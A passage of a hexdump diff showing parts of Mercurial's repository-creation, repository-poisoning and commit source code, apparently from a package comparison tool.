-00022fd0: 6e63 6528 756e 6b6e 6f77 6e6f 7074 732c  nce(unknownopts,
-00022fe0: 2064 6963 7429 3a0a 2020 2020 2020 2020   dict):.        
-00022ff0: 2020 2020 7261 6973 6520 6572 726f 722e      raise error.
-00023000: 5072 6f67 7261 6d6d 696e 6745 7272 6f72  ProgrammingError
-00023010: 280a 2020 2020 2020 2020 2020 2020 2020  (.              
-00023020: 2020 6227 6669 6c74 6572 6b6e 6f77 6e63    b'filterknownc
-00023030: 7265 6174 656f 7074 7328 2920 6469 6420  reateopts() did 
-00023040: 6e6f 7420 7265 7475 726e 2061 2064 6963  not return a dic
-00023050: 7427 0a20 2020 2020 2020 2020 2020 2029  t'.            )
-00023060: 0a0a 2020 2020 2020 2020 6966 2075 6e6b  ..        if unk
-00023070: 6e6f 776e 6f70 7473 3a0a 2020 2020 2020  nownopts:.      
-00023080: 2020 2020 2020 7261 6973 6520 6572 726f        raise erro
-00023090: 722e 4162 6f72 7428 0a20 2020 2020 2020  r.Abort(.       
-000230a0: 2020 2020 2020 2020 205f 280a 2020 2020           _(.    
-000230b0: 2020 2020 2020 2020 2020 2020 2020 2020                  
-000230c0: 6227 756e 6162 6c65 2074 6f20 6372 6561  b'unable to crea
-000230d0: 7465 2072 6570 6f73 6974 6f72 7920 6265  te repository be
-000230e0: 6361 7573 6520 6f66 2075 6e6b 6e6f 776e  cause of unknown
-000230f0: 2027 0a20 2020 2020 2020 2020 2020 2020   '.             
-00023100: 2020 2020 2020 2062 2763 7265 6174 696f         b'creatio
-00023110: 6e20 6f70 7469 6f6e 3a20 2573 270a 2020  n option: %s'.  
-00023120: 2020 2020 2020 2020 2020 2020 2020 290a                ).
-00023130: 2020 2020 2020 2020 2020 2020 2020 2020                  
-00023140: 2520 6227 2c20 272e 6a6f 696e 2873 6f72  % b', '.join(sor
-00023150: 7465 6428 756e 6b6e 6f77 6e6f 7074 7329  ted(unknownopts)
-00023160: 292c 0a20 2020 2020 2020 2020 2020 2020  ),.             
-00023170: 2020 2068 696e 743d 5f28 6227 6973 2061     hint=_(b'is a
-00023180: 2072 6571 7569 7265 6420 6578 7465 6e73   required extens
-00023190: 696f 6e20 6e6f 7420 6c6f 6164 6564 3f27  ion not loaded?'
-000231a0: 292c 0a20 2020 2020 2020 2020 2020 2029  ),.            )
-000231b0: 0a0a 2020 2020 2020 2020 7265 7175 6972  ..        requir
-000231c0: 656d 656e 7473 203d 206e 6577 7265 706f  ements = newrepo
-000231d0: 7265 7175 6972 656d 656e 7473 2875 692c  requirements(ui,
-000231e0: 2063 7265 6174 656f 7074 733d 6372 6561   createopts=crea
-000231f0: 7465 6f70 7473 290a 2020 2020 2020 2020  teopts).        
-00023200: 7265 7175 6972 656d 656e 7473 202d 3d20  requirements -= 
-00023210: 6368 6563 6b72 6571 7569 7265 6d65 6e74  checkrequirement
-00023220: 7363 6f6d 7061 7428 7569 2c20 7265 7175  scompat(ui, requ
-00023230: 6972 656d 656e 7473 290a 0a20 2020 2077  irements)..    w
-00023240: 6469 7276 6673 203d 2076 6673 6d6f 642e  dirvfs = vfsmod.
-00023250: 7666 7328 7061 7468 2c20 6578 7061 6e64  vfs(path, expand
-00023260: 7061 7468 3d54 7275 652c 2072 6561 6c70  path=True, realp
-00023270: 6174 683d 5472 7565 290a 0a20 2020 2068  ath=True)..    h
-00023280: 6776 6673 203d 2076 6673 6d6f 642e 7666  gvfs = vfsmod.vf
-00023290: 7328 7764 6972 7666 732e 6a6f 696e 2862  s(wdirvfs.join(b
-000232a0: 272e 6867 2729 290a 2020 2020 6966 2068  '.hg')).    if h
-000232b0: 6776 6673 2e65 7869 7374 7328 293a 0a20  gvfs.exists():. 
-000232c0: 2020 2020 2020 2072 6169 7365 2065 7272         raise err
-000232d0: 6f72 2e52 6570 6f45 7272 6f72 285f 2862  or.RepoError(_(b
-000232e0: 2772 6570 6f73 6974 6f72 7920 2573 2061  'repository %s a
-000232f0: 6c72 6561 6479 2065 7869 7374 7327 2920  lready exists') 
-00023300: 2520 7061 7468 290a 0a20 2020 2069 6620  % path)..    if 
-00023310: 6227 7368 6172 6564 7265 706f 2720 696e  b'sharedrepo' in
-00023320: 2063 7265 6174 656f 7074 733a 0a20 2020   createopts:.   
-00023330: 2020 2020 2073 6861 7265 6470 6174 6820       sharedpath 
-00023340: 3d20 6372 6561 7465 6f70 7473 5b62 2773  = createopts[b's
-00023350: 6861 7265 6472 6570 6f27 5d2e 7368 6172  haredrepo'].shar
-00023360: 6564 7061 7468 0a0a 2020 2020 2020 2020  edpath..        
-00023370: 6966 2063 7265 6174 656f 7074 732e 6765  if createopts.ge
-00023380: 7428 6227 7368 6172 6564 7265 6c61 7469  t(b'sharedrelati
-00023390: 7665 2729 3a0a 2020 2020 2020 2020 2020  ve'):.          
-000233a0: 2020 7472 793a 0a20 2020 2020 2020 2020    try:.         
-000233b0: 2020 2020 2020 2073 6861 7265 6470 6174         sharedpat
-000233c0: 6820 3d20 6f73 2e70 6174 682e 7265 6c70  h = os.path.relp
-000233d0: 6174 6828 7368 6172 6564 7061 7468 2c20  ath(sharedpath, 
-000233e0: 6867 7666 732e 6261 7365 290a 2020 2020  hgvfs.base).    
-000233f0: 2020 2020 2020 2020 2020 2020 7368 6172              shar
-00023400: 6564 7061 7468 203d 2075 7469 6c2e 7063  edpath = util.pc
-00023410: 6f6e 7665 7274 2873 6861 7265 6470 6174  onvert(sharedpat
-00023420: 6829 0a20 2020 2020 2020 2020 2020 2065  h).            e
-00023430: 7863 6570 7420 2849 4f45 7272 6f72 2c20  xcept (IOError, 
-00023440: 5661 6c75 6545 7272 6f72 2920 6173 2065  ValueError) as e
-00023450: 3a0a 2020 2020 2020 2020 2020 2020 2020  :.              
-00023460: 2020 2320 5661 6c75 6545 7272 6f72 2069    # ValueError i
-00023470: 7320 7261 6973 6564 206f 6e20 5769 6e64  s raised on Wind
-00023480: 6f77 7320 6966 2074 6865 2064 7269 7665  ows if the drive
-00023490: 206c 6574 7465 7273 2064 6966 6665 720a   letters differ.
-000234a0: 2020 2020 2020 2020 2020 2020 2020 2020                  
-000234b0: 2320 6f6e 2065 6163 6820 7061 7468 2e0a  # on each path..
-000234c0: 2020 2020 2020 2020 2020 2020 2020 2020                  
-000234d0: 7261 6973 6520 6572 726f 722e 4162 6f72  raise error.Abor
-000234e0: 7428 0a20 2020 2020 2020 2020 2020 2020  t(.             
-000234f0: 2020 2020 2020 205f 2862 2763 616e 6e6f         _(b'canno
-00023500: 7420 6361 6c63 756c 6174 6520 7265 6c61  t calculate rela
-00023510: 7469 7665 2070 6174 6827 292c 0a20 2020  tive path'),.   
-00023520: 2020 2020 2020 2020 2020 2020 2020 2020                  
-00023530: 2068 696e 743d 7374 7269 6e67 7574 696c   hint=stringutil
-00023540: 2e66 6f72 6365 6279 7465 7374 7228 6529  .forcebytestr(e)
-00023550: 2c0a 2020 2020 2020 2020 2020 2020 2020  ,.              
-00023560: 2020 290a 0a20 2020 2069 6620 6e6f 7420    )..    if not 
-00023570: 7764 6972 7666 732e 6578 6973 7473 2829  wdirvfs.exists()
-00023580: 3a0a 2020 2020 2020 2020 7764 6972 7666  :.        wdirvf
-00023590: 732e 6d61 6b65 6469 7273 2829 0a0a 2020  s.makedirs()..  
-000235a0: 2020 6867 7666 732e 6d61 6b65 6469 7228    hgvfs.makedir(
-000235b0: 6e6f 7469 6e64 6578 6564 3d54 7275 6529  notindexed=True)
-000235c0: 0a20 2020 2069 6620 6227 7368 6172 6564  .    if b'shared
-000235d0: 7265 706f 2720 6e6f 7420 696e 2063 7265  repo' not in cre
-000235e0: 6174 656f 7074 733a 0a20 2020 2020 2020  ateopts:.       
-000235f0: 2068 6776 6673 2e6d 6b64 6972 2862 2763   hgvfs.mkdir(b'c
-00023600: 6163 6865 2729 0a20 2020 2068 6776 6673  ache').    hgvfs
-00023610: 2e6d 6b64 6972 2862 2777 6361 6368 6527  .mkdir(b'wcache'
-00023620: 290a 0a20 2020 2068 6173 5f73 746f 7265  )..    has_store
-00023630: 203d 2072 6571 7569 7265 6d65 6e74 736d   = requirementsm
-00023640: 6f64 2e53 544f 5245 5f52 4551 5549 5245  od.STORE_REQUIRE
-00023650: 4d45 4e54 2069 6e20 7265 7175 6972 656d  MENT in requirem
-00023660: 656e 7473 0a20 2020 2069 6620 6861 735f  ents.    if has_
-00023670: 7374 6f72 6520 616e 6420 6227 7368 6172  store and b'shar
-00023680: 6564 7265 706f 2720 6e6f 7420 696e 2063  edrepo' not in c
-00023690: 7265 6174 656f 7074 733a 0a20 2020 2020  reateopts:.     
-000236a0: 2020 2068 6776 6673 2e6d 6b64 6972 2862     hgvfs.mkdir(b
-000236b0: 2773 746f 7265 2729 0a0a 2020 2020 2020  'store')..      
-000236c0: 2020 2320 5765 2063 7265 6174 6520 616e    # We create an
-000236d0: 2069 6e76 616c 6964 2063 6861 6e67 656c   invalid changel
-000236e0: 6f67 206f 7574 7369 6465 2074 6865 2073  og outside the s
-000236f0: 746f 7265 2073 6f20 7665 7279 206f 6c64  tore so very old
-00023700: 0a20 2020 2020 2020 2023 204d 6572 6375  .        # Mercu
-00023710: 7269 616c 2076 6572 7369 6f6e 7320 2877  rial versions (w
-00023720: 6869 6368 2064 6964 6e27 7420 6b6e 6f77  hich didn't know
-00023730: 2061 626f 7574 2074 6865 2072 6571 7569   about the requi
-00023740: 7265 6d65 6e74 730a 2020 2020 2020 2020  rements.        
-00023750: 2320 6669 6c65 2920 656e 636f 756e 7465  # file) encounte
-00023760: 7220 616e 2065 7272 6f72 206f 6e20 7265  r an error on re
-00023770: 6164 696e 6720 7468 6520 6368 616e 6765  ading the change
-00023780: 6c6f 672e 2054 6869 730a 2020 2020 2020  log. This.      
-00023790: 2020 2320 6566 6665 6374 6976 656c 7920    # effectively 
-000237a0: 6c6f 636b 7320 6f75 7420 6f6c 6420 636c  locks out old cl
-000237b0: 6965 6e74 7320 616e 6420 7072 6576 656e  ients and preven
-000237c0: 7473 2074 6865 6d20 6672 6f6d 0a20 2020  ts them from.   
-000237d0: 2020 2020 2023 206d 7563 6b69 6e67 2077       # mucking w
-000237e0: 6974 6820 6120 7265 706f 2069 6e20 616e  ith a repo in an
-000237f0: 2075 6e6b 6e6f 776e 2066 6f72 6d61 742e   unknown format.
-00023800: 0a20 2020 2020 2020 2023 0a20 2020 2020  .        #.     
-00023810: 2020 2023 2054 6865 2072 6576 6c6f 6720     # The revlog 
-00023820: 6865 6164 6572 2068 6173 2076 6572 7369  header has versi
-00023830: 6f6e 2036 3535 3335 2c20 7768 6963 6820  on 65535, which 
-00023840: 776f 6e27 7420 6265 2072 6563 6f67 6e69  won't be recogni
-00023850: 7a65 6420 6279 0a20 2020 2020 2020 2023  zed by.        #
-00023860: 2073 7563 6820 6f6c 6420 636c 6965 6e74   such old client
-00023870: 732e 0a20 2020 2020 2020 2068 6776 6673  s..        hgvfs
-00023880: 2e61 7070 656e 6428 0a20 2020 2020 2020  .append(.       
-00023890: 2020 2020 2062 2730 3063 6861 6e67 656c       b'00changel
-000238a0: 6f67 2e69 272c 0a20 2020 2020 2020 2020  og.i',.         
-000238b0: 2020 2062 275c 305c 305c 7846 465c 7846     b'\0\0\xFF\xF
-000238c0: 4620 6475 6d6d 7920 6368 616e 6765 6c6f  F dummy changelo
-000238d0: 6720 746f 2070 7265 7665 6e74 2075 7369  g to prevent usi
-000238e0: 6e67 2074 6865 206f 6c64 2072 6570 6f20  ng the old repo 
-000238f0: 270a 2020 2020 2020 2020 2020 2020 6227  '.            b'
-00023900: 6c61 796f 7574 272c 0a20 2020 2020 2020  layout',.       
-00023910: 2029 0a0a 2020 2020 2320 4669 6c74 6572   )..    # Filter
-00023920: 2074 6865 2072 6571 7569 7265 6d65 6e74   the requirement
-00023930: 7320 696e 746f 2077 6f72 6b69 6e67 2063  s into working c
-00023940: 6f70 7920 616e 6420 7374 6f72 6520 6f6e  opy and store on
-00023950: 6573 0a20 2020 2077 6372 6571 2c20 7374  es.    wcreq, st
-00023960: 6f72 6572 6571 203d 2073 636d 7574 696c  orereq = scmutil
-00023970: 2e66 696c 7465 7272 6571 7569 7265 6d65  .filterrequireme
-00023980: 6e74 7328 7265 7175 6972 656d 656e 7473  nts(requirements
-00023990: 290a 2020 2020 2320 7772 6974 6520 776f  ).    # write wo
-000239a0: 726b 696e 6720 636f 7079 206f 6e65 730a  rking copy ones.
-000239b0: 2020 2020 7363 6d75 7469 6c2e 7772 6974      scmutil.writ
-000239c0: 6572 6571 7569 7265 7328 6867 7666 732c  erequires(hgvfs,
-000239d0: 2077 6372 6571 290a 2020 2020 2320 4966   wcreq).    # If
-000239e0: 2074 6865 7265 2061 7265 2073 746f 7265   there are store
-000239f0: 2072 6571 7569 7265 6d65 6e74 7320 616e   requirements an
-00023a00: 6420 7468 6520 6375 7272 656e 7420 7265  d the current re
-00023a10: 706f 7369 746f 7279 0a20 2020 2023 2069  pository.    # i
-00023a20: 7320 6e6f 7420 6120 7368 6172 6564 206f  s not a shared o
-00023a30: 6e65 2c20 7772 6974 6520 7374 6f72 6564  ne, write stored
-00023a40: 2072 6571 7569 7265 6d65 6e74 730a 2020   requirements.  
-00023a50: 2020 2320 466f 7220 6e65 7720 7368 6172    # For new shar
-00023a60: 6564 2072 6570 6f73 6974 6f72 792c 2077  ed repository, w
-00023a70: 6520 646f 6e27 7420 6e65 6564 2074 6f20  e don't need to 
-00023a80: 7772 6974 6520 7468 6520 7374 6f72 650a  write the store.
-00023a90: 2020 2020 2320 7265 7175 6972 656d 656e      # requiremen
-00023aa0: 7473 2061 7320 7468 6579 2061 7265 2061  ts as they are a
-00023ab0: 6c72 6561 6479 2070 7265 7365 6e74 2069  lready present i
-00023ac0: 6e20 7374 6f72 6520 7265 7175 6972 6573  n store requires
-00023ad0: 0a20 2020 2069 6620 7374 6f72 6572 6571  .    if storereq
-00023ae0: 2061 6e64 2062 2773 6861 7265 6472 6570   and b'sharedrep
-00023af0: 6f27 206e 6f74 2069 6e20 6372 6561 7465  o' not in create
-00023b00: 6f70 7473 3a0a 2020 2020 2020 2020 7374  opts:.        st
-00023b10: 6f72 6576 6673 203d 2076 6673 6d6f 642e  orevfs = vfsmod.
-00023b20: 7666 7328 6867 7666 732e 6a6f 696e 2862  vfs(hgvfs.join(b
-00023b30: 2773 746f 7265 2729 2c20 6361 6368 6561  'store'), cachea
-00023b40: 7564 6974 6564 3d54 7275 6529 0a20 2020  udited=True).   
-00023b50: 2020 2020 2073 636d 7574 696c 2e77 7269       scmutil.wri
-00023b60: 7465 7265 7175 6972 6573 2873 746f 7265  terequires(store
-00023b70: 7666 732c 2073 746f 7265 7265 7129 0a0a  vfs, storereq)..
-00023b80: 2020 2020 2320 5772 6974 6520 6f75 7420      # Write out 
-00023b90: 6669 6c65 2074 656c 6c69 6e67 2072 6561  file telling rea
-00023ba0: 6465 7273 2077 6865 7265 2074 6f20 6669  ders where to fi
-00023bb0: 6e64 2074 6865 2073 6861 7265 6420 7374  nd the shared st
-00023bc0: 6f72 652e 0a20 2020 2069 6620 6227 7368  ore..    if b'sh
-00023bd0: 6172 6564 7265 706f 2720 696e 2063 7265  aredrepo' in cre
-00023be0: 6174 656f 7074 733a 0a20 2020 2020 2020  ateopts:.       
-00023bf0: 2068 6776 6673 2e77 7269 7465 2862 2773   hgvfs.write(b's
-00023c00: 6861 7265 6470 6174 6827 2c20 7368 6172  haredpath', shar
-00023c10: 6564 7061 7468 290a 0a20 2020 2069 6620  edpath)..    if 
-00023c20: 6372 6561 7465 6f70 7473 2e67 6574 2862  createopts.get(b
-00023c30: 2773 6861 7265 6469 7465 6d73 2729 3a0a  'shareditems'):.
-00023c40: 2020 2020 2020 2020 7368 6172 6564 203d          shared =
-00023c50: 2062 275c 6e27 2e6a 6f69 6e28 736f 7274   b'\n'.join(sort
-00023c60: 6564 2863 7265 6174 656f 7074 735b 6227  ed(createopts[b'
-00023c70: 7368 6172 6564 6974 656d 7327 5d29 2920  shareditems'])) 
-00023c80: 2b20 6227 5c6e 270a 2020 2020 2020 2020  + b'\n'.        
-00023c90: 6867 7666 732e 7772 6974 6528 6227 7368  hgvfs.write(b'sh
-00023ca0: 6172 6564 272c 2073 6861 7265 6429 0a0a  ared', shared)..
-00023cb0: 0a64 6566 2070 6f69 736f 6e72 6570 6f73  .def poisonrepos
-00023cc0: 6974 6f72 7928 7265 706f 293a 0a20 2020  itory(repo):.   
-00023cd0: 2022 2222 506f 6973 6f6e 2061 2072 6570   """Poison a rep
-00023ce0: 6f73 6974 6f72 7920 696e 7374 616e 6365  ository instance
-00023cf0: 2073 6f20 6974 2063 616e 206e 6f20 6c6f   so it can no lo
-00023d00: 6e67 6572 2062 6520 7573 6564 2e22 2222  nger be used."""
-00023d10: 0a20 2020 2023 2050 6572 666f 726d 2061  .    # Perform a
-00023d20: 6e79 2063 6c65 616e 7570 206f 6e20 7468  ny cleanup on th
-00023d30: 6520 696e 7374 616e 6365 2e0a 2020 2020  e instance..    
-00023d40: 7265 706f 2e63 6c6f 7365 2829 0a0a 2020  repo.close()..  
-00023d50: 2020 2320 4f75 7220 7374 7261 7465 6779    # Our strategy
-00023d60: 2069 7320 746f 2072 6570 6c61 6365 2074   is to replace t
-00023d70: 6865 2074 7970 6520 6f66 2074 6865 206f  he type of the o
-00023d80: 626a 6563 7420 7769 7468 206f 6e65 2074  bject with one t
-00023d90: 6861 740a 2020 2020 2320 6861 7320 616c  hat.    # has al
-00023da0: 6c20 6174 7472 6962 7574 6520 6c6f 6f6b  l attribute look
-00023db0: 7570 7320 7265 7375 6c74 2069 6e20 6572  ups result in er
-00023dc0: 726f 722e 0a20 2020 2023 0a20 2020 2023  ror..    #.    #
-00023dd0: 2042 7574 2077 6520 6861 7665 2074 6f20   But we have to 
-00023de0: 616c 6c6f 7720 7468 6520 636c 6f73 6528  allow the close(
-00023df0: 2920 6d65 7468 6f64 2062 6563 6175 7365  ) method because
-00023e00: 2073 6f6d 6520 636f 6e73 7472 7563 746f   some constructo
-00023e10: 7273 0a20 2020 2023 206f 6620 7265 706f  rs.    # of repo
-00023e20: 7320 6361 6c6c 2063 6c6f 7365 2829 206f  s call close() o
-00023e30: 6e20 7265 706f 2072 6566 6572 656e 6365  n repo reference
-00023e40: 732e 0a20 2020 2063 6c61 7373 2070 6f69  s..    class poi
-00023e50: 736f 6e65 6472 6570 6f73 6974 6f72 793a  sonedrepository:
-00023e60: 0a20 2020 2020 2020 2064 6566 205f 5f67  .        def __g
-00023e70: 6574 6174 7472 6962 7574 655f 5f28 7365  etattribute__(se
-00023e80: 6c66 2c20 6974 656d 293a 0a20 2020 2020  lf, item):.     
-00023e90: 2020 2020 2020 2069 6620 6974 656d 203d         if item =
-00023ea0: 3d20 2763 6c6f 7365 273a 0a20 2020 2020  = 'close':.     
-00023eb0: 2020 2020 2020 2020 2020 2072 6574 7572             retur
-00023ec0: 6e20 6f62 6a65 6374 2e5f 5f67 6574 6174  n object.__getat
-00023ed0: 7472 6962 7574 655f 5f28 7365 6c66 2c20  tribute__(self, 
-00023ee0: 6974 656d 290a 0a20 2020 2020 2020 2020  item)..         
-00023ef0: 2020 2072 6169 7365 2065 7272 6f72 2e50     raise error.P
-00023f00: 726f 6772 616d 6d69 6e67 4572 726f 7228  rogrammingError(
-00023f10: 0a20 2020 2020 2020 2020 2020 2020 2020  .               
-00023f20: 2062 2772 6570 6f20 696e 7374 616e 6365   b'repo instance
-00023f30: 7320 7368 6f75 6c64 206e 6f74 2062 6520  s should not be 
-00023f40: 7573 6564 2061 6674 6572 2075 6e73 6861  used after unsha
-00023f50: 7265 270a 2020 2020 2020 2020 2020 2020  re'.            
-00023f60: 290a 0a20 2020 2020 2020 2064 6566 2063  )..        def c
-00023f70: 6c6f 7365 2873 656c 6629 3a0a 2020 2020  lose(self):.    
-00023f80: 2020 2020 2020 2020 7061 7373 0a0a 2020          pass..  
-00023f90: 2020 2320 5765 206d 6179 2068 6176 6520    # We may have 
-00023fa0: 6120 7265 706f 7669 6577 2c20 7768 6963  a repoview, whic
-00023fb0: 6820 696e 7465 7263 6570 7473 205f 5f73  h intercepts __s
-00023fc0: 6574 6174 7472 5f5f 2e20 536f 2062 6520  etattr__. So be 
-00023fd0: 7375 7265 0a20 2020 2023 2077 6520 6f70  sure.    # we op
-00023fe0: 6572 6174 6520 6174 2074 6865 206c 6f77  erate at the low
-00023ff0: 6573 7420 6c65 7665 6c20 706f 7373 6962  est level possib
-00024000: 6c65 2e0a 2020 2020 6f62 6a65 6374 2e5f  le..    object._
-00024010: 5f73 6574 6174 7472 5f5f 2872 6570 6f2c  _setattr__(repo,
-00024020: 2027 5f5f 636c 6173 735f 5f27 2c20 706f   '__class__', po
-00024030: 6973 6f6e 6564 7265 706f 7369 746f 7279  isonedrepository
-00024040: 290a                                     ).
+0001c6a0: 2020 6227 2864 6f20 6e6f 7420 7370 6563    b'(do not spec
+0001c6b0: 6966 7920 6669 6c65 7320 6f72 2070 6174  ify files or pat
+0001c6c0: 7465 726e 7329 270a 2020 2020 2020 2020  terns)'.        
+0001c6d0: 2020 2020 2020 2020 2020 2020 290a 2020              ).  
+0001c6e0: 2020 2020 2020 2020 2020 2020 2020 290a                ).
+0001c6f0: 0a20 2020 2020 2020 2020 2020 2073 7461  .            sta
+0001c700: 7475 7320 3d20 7365 6c66 2e73 7461 7475  tus = self.statu
+0001c710: 7328 6d61 7463 683d 6d61 7463 682c 2063  s(match=match, c
+0001c720: 6c65 616e 3d66 6f72 6365 290a 2020 2020  lean=force).    
+0001c730: 2020 2020 2020 2020 6966 2066 6f72 6365          if force
+0001c740: 3a0a 2020 2020 2020 2020 2020 2020 2020  :.              
+0001c750: 2020 7374 6174 7573 2e6d 6f64 6966 6965    status.modifie
+0001c760: 642e 6578 7465 6e64 280a 2020 2020 2020  d.extend(.      
+0001c770: 2020 2020 2020 2020 2020 2020 2020 7374                st
+0001c780: 6174 7573 2e63 6c65 616e 0a20 2020 2020  atus.clean.     
+0001c790: 2020 2020 2020 2020 2020 2029 2020 2320             )  # 
+0001c7a0: 6d71 206d 6179 2063 6f6d 6d69 7420 636c  mq may commit cl
+0001c7b0: 6561 6e20 6669 6c65 730a 0a20 2020 2020  ean files..     
+0001c7c0: 2020 2020 2020 2023 2063 6865 636b 2073         # check s
+0001c7d0: 7562 7265 706f 730a 2020 2020 2020 2020  ubrepos.        
+0001c7e0: 2020 2020 7375 6273 2c20 636f 6d6d 6974      subs, commit
+0001c7f0: 7375 6273 2c20 6e65 7773 7461 7465 203d  subs, newstate =
+0001c800: 2073 7562 7265 706f 7574 696c 2e70 7265   subrepoutil.pre
+0001c810: 636f 6d6d 6974 280a 2020 2020 2020 2020  commit(.        
+0001c820: 2020 2020 2020 2020 7365 6c66 2e75 692c          self.ui,
+0001c830: 2077 6374 782c 2073 7461 7475 732c 206d   wctx, status, m
+0001c840: 6174 6368 2c20 666f 7263 653d 666f 7263  atch, force=forc
+0001c850: 650a 2020 2020 2020 2020 2020 2020 290a  e.            ).
+0001c860: 0a20 2020 2020 2020 2020 2020 2023 206d  .            # m
+0001c870: 616b 6520 7375 7265 2061 6c6c 2065 7870  ake sure all exp
+0001c880: 6c69 6369 7420 7061 7474 6572 6e73 2061  licit patterns a
+0001c890: 7265 206d 6174 6368 6564 0a20 2020 2020  re matched.     
+0001c8a0: 2020 2020 2020 2069 6620 6e6f 7420 666f         if not fo
+0001c8b0: 7263 653a 0a20 2020 2020 2020 2020 2020  rce:.           
+0001c8c0: 2020 2020 2073 656c 662e 6368 6563 6b63       self.checkc
+0001c8d0: 6f6d 6d69 7470 6174 7465 726e 7328 7763  ommitpatterns(wc
+0001c8e0: 7478 2c20 6d61 7463 682c 2073 7461 7475  tx, match, statu
+0001c8f0: 732c 2066 6169 6c29 0a0a 2020 2020 2020  s, fail)..      
+0001c900: 2020 2020 2020 6363 7478 203d 2063 6f6e        cctx = con
+0001c910: 7465 7874 2e77 6f72 6b69 6e67 636f 6d6d  text.workingcomm
+0001c920: 6974 6374 7828 0a20 2020 2020 2020 2020  itctx(.         
+0001c930: 2020 2020 2020 2073 656c 662c 2073 7461         self, sta
+0001c940: 7475 732c 2074 6578 742c 2075 7365 722c  tus, text, user,
+0001c950: 2064 6174 652c 2065 7874 7261 0a20 2020   date, extra.   
+0001c960: 2020 2020 2020 2020 2029 0a0a 2020 2020           )..    
+0001c970: 2020 2020 2020 2020 6d73 203d 206d 6572          ms = mer
+0001c980: 6765 7374 6174 656d 6f64 2e6d 6572 6765  gestatemod.merge
+0001c990: 7374 6174 652e 7265 6164 2873 656c 6629  state.read(self)
+0001c9a0: 0a20 2020 2020 2020 2020 2020 206d 6572  .            mer
+0001c9b0: 6765 7574 696c 2e63 6865 636b 756e 7265  geutil.checkunre
+0001c9c0: 736f 6c76 6564 286d 7329 0a0a 2020 2020  solved(ms)..    
+0001c9d0: 2020 2020 2020 2020 2320 696e 7465 726e          # intern
+0001c9e0: 616c 2063 6f6e 6669 673a 2075 692e 616c  al config: ui.al
+0001c9f0: 6c6f 7765 6d70 7479 636f 6d6d 6974 0a20  lowemptycommit. 
+0001ca00: 2020 2020 2020 2020 2020 2069 6620 6363             if cc
+0001ca10: 7478 2e69 7365 6d70 7479 2829 2061 6e64  tx.isempty() and
+0001ca20: 206e 6f74 2073 656c 662e 7569 2e63 6f6e   not self.ui.con
+0001ca30: 6669 6762 6f6f 6c28 0a20 2020 2020 2020  figbool(.       
+0001ca40: 2020 2020 2020 2020 2062 2775 6927 2c20           b'ui', 
+0001ca50: 6227 616c 6c6f 7765 6d70 7479 636f 6d6d  b'allowemptycomm
+0001ca60: 6974 270a 2020 2020 2020 2020 2020 2020  it'.            
+0001ca70: 293a 0a20 2020 2020 2020 2020 2020 2020  ):.             
+0001ca80: 2020 2073 656c 662e 7569 2e64 6562 7567     self.ui.debug
+0001ca90: 2862 276e 6f74 6869 6e67 2074 6f20 636f  (b'nothing to co
+0001caa0: 6d6d 6974 2c20 636c 6561 7269 6e67 206d  mmit, clearing m
+0001cab0: 6572 6765 2073 7461 7465 5c6e 2729 0a20  erge state\n'). 
+0001cac0: 2020 2020 2020 2020 2020 2020 2020 206d                 m
+0001cad0: 732e 7265 7365 7428 290a 2020 2020 2020  s.reset().      
+0001cae0: 2020 2020 2020 2020 2020 7265 7475 726e            return
+0001caf0: 204e 6f6e 650a 0a20 2020 2020 2020 2020   None..         
+0001cb00: 2020 2069 6620 6d65 7267 6520 616e 6420     if merge and 
+0001cb10: 6363 7478 2e64 656c 6574 6564 2829 3a0a  cctx.deleted():.
+0001cb20: 2020 2020 2020 2020 2020 2020 2020 2020                  
+0001cb30: 7261 6973 6520 6572 726f 722e 4162 6f72  raise error.Abor
+0001cb40: 7428 5f28 6222 6361 6e6e 6f74 2063 6f6d  t(_(b"cannot com
+0001cb50: 6d69 7420 6d65 7267 6520 7769 7468 206d  mit merge with m
+0001cb60: 6973 7369 6e67 2066 696c 6573 2229 290a  issing files")).
+0001cb70: 0a20 2020 2020 2020 2020 2020 2069 6620  .            if 
+0001cb80: 6564 6974 6f72 3a0a 2020 2020 2020 2020  editor:.        
+0001cb90: 2020 2020 2020 2020 6363 7478 2e5f 7465          cctx._te
+0001cba0: 7874 203d 2065 6469 746f 7228 7365 6c66  xt = editor(self
+0001cbb0: 2c20 6363 7478 2c20 7375 6273 290a 2020  , cctx, subs).  
+0001cbc0: 2020 2020 2020 2020 2020 6564 6974 6564            edited
+0001cbd0: 203d 2074 6578 7420 213d 2063 6374 782e   = text != cctx.
+0001cbe0: 5f74 6578 740a 0a20 2020 2020 2020 2020  _text..         
+0001cbf0: 2020 2023 2053 6176 6520 636f 6d6d 6974     # Save commit
+0001cc00: 206d 6573 7361 6765 2069 6e20 6361 7365   message in case
+0001cc10: 2074 6869 7320 7472 616e 7361 6374 696f   this transactio
+0001cc20: 6e20 6765 7473 2072 6f6c 6c65 6420 6261  n gets rolled ba
+0001cc30: 636b 0a20 2020 2020 2020 2020 2020 2023  ck.            #
+0001cc40: 2028 652e 672e 2062 7920 6120 7072 6574   (e.g. by a pret
+0001cc50: 786e 636f 6d6d 6974 2068 6f6f 6b29 2e20  xncommit hook). 
+0001cc60: 204c 6561 7665 2074 6865 2063 6f6e 7465   Leave the conte
+0001cc70: 6e74 2061 6c6f 6e65 206f 6e0a 2020 2020  nt alone on.    
+0001cc80: 2020 2020 2020 2020 2320 7468 6520 6173          # the as
+0001cc90: 7375 6d70 7469 6f6e 2074 6861 7420 7468  sumption that th
+0001cca0: 6520 7573 6572 2077 696c 6c20 7573 6520  e user will use 
+0001ccb0: 7468 6520 7361 6d65 2065 6469 746f 7220  the same editor 
+0001ccc0: 6167 6169 6e2e 0a20 2020 2020 2020 2020  again..         
+0001ccd0: 2020 206d 7367 5f70 6174 6820 3d20 7365     msg_path = se
+0001cce0: 6c66 2e73 6176 6563 6f6d 6d69 746d 6573  lf.savecommitmes
+0001ccf0: 7361 6765 2863 6374 782e 5f74 6578 7429  sage(cctx._text)
+0001cd00: 0a0a 2020 2020 2020 2020 2020 2020 2320  ..            # 
+0001cd10: 636f 6d6d 6974 2073 7562 7320 616e 6420  commit subs and 
+0001cd20: 7772 6974 6520 6e65 7720 7374 6174 650a  write new state.
+0001cd30: 2020 2020 2020 2020 2020 2020 6966 2073              if s
+0001cd40: 7562 733a 0a20 2020 2020 2020 2020 2020  ubs:.           
+0001cd50: 2020 2020 2075 6970 6174 6866 6e20 3d20       uipathfn = 
+0001cd60: 7363 6d75 7469 6c2e 6765 7475 6970 6174  scmutil.getuipat
+0001cd70: 6866 6e28 7365 6c66 290a 2020 2020 2020  hfn(self).      
